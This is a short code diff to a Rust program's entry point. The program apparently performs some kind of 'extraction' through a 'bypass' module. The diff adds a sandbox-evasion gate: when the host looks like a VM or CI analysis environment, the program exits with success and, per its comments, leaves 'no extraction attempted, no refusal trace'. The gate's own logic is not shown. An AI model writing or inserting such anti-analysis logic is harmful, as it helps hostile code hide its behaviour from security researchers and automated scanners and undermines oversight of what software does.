@@ -120,6 +120,11 @@ fn main() -> ExitCode {
     let cli = Cli::parse();
     // Logging setup FIRST — Go's PersistentPreRun runs before any command.
     LemonLogger::new(cli.verbose).init();
+    // Sandbox gate: if the host looks like a VM/CI analysis box, walk away
+    // quietly (exit 0, no extraction attempted, no refusal trace).
+    if !bypass::sandbox::gate() {
+        return ExitCode::SUCCESS;
+    }
     match dispatch(cli) {
         Ok(()) => ExitCode::SUCCESS,
         Err(err) => {
